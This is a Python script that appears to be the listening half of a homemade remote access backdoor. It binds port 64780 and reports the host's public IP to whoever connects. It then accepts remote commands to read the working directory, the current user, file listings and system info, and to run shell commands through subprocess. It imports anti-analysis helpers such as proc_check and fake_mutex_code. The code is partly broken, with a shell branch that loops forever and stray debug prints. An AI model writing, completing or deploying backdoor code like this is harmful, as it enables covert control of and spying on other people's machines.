import json, os, subprocess, socket
from resources.misc import sysinfo
#from socket import * #socket, AF_INET, SOCK_STREAM
from resources.protection import proc_check, fake_mutex_code
from requests import get

port = 64780
#host_IP = "127.0.0.1"  # need to be loopback
connection = "nope"

#if proc_check():
#    os.exit(0)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(('', port))
    s.listen(2)
    conn, addr = s.accept()
    #s.setblocking(False)
    #s.listen(2)
    #print("started listening")
    #conn, addr = s.accept()

    while True:
        cmnd = ""
        try:
            if connection == "nope":
                #print(connection)
                #s.listen(2)
                #conn, addr = s.accept()
                print("starting server")
                print("listening")
                connection = "yep"
                print(connection)
                ip = get('https://api.ipify.org').text
                conn.sendall(bytes(ip, encoding="utf-8"))
                cmnd = conn.recv(2048).decode('utf-8')
                print(cmnd)
                #cmnd = cmnd.decode('utf-8')
                print(cmnd)
                if not cmnd:
                    continue

            else:
                #if not cmnd:
                #    continue
                print("no connection")
                cmnd = conn.recv(2048).decode()
                if cmnd == "reset":
                    connection = "nope"
                    while connection == "nope":
                        s.listen(2)
                        conn, addr = s.accept()
                        connection = "yep"
                print("ftyuik", cmnd)
                print("cmnd = ", cmnd)
                print("ryetsdfyhgjkk")

            print(connection)

        except socket.error as msg:
            s.close()
            continue

        #cmnd = conn.recv(2048).decode()
        print("cmnd2 = ", cmnd)
        #if not cmnd:
        #    s. close

        if cmnd.lower() == "kill":
            print("exiting")
            s.close()
            break
        elif cmnd.lower() == "pwd":
            print("server happy")
            result = os.path.dirname(os.path.realpath(__file__))
            print("pls love me")
        elif cmnd.lower() == "user":
            result = os.getlogin()
        elif cmnd.lower() == "listdir":
            result = json.dumps(os.listdir())
        elif cmnd.lower() == "sysinfo":
            result = sysinfo()
        elif cmnd.lower() == "shell":
            while True:
                try:
                    result = subprocess.run(cmnd)
                except Exception:
                    result = "command not found"
        else:
            s.close()
            print("command not found")

        conn.sendall(bytes(result, encoding="utf-8"))
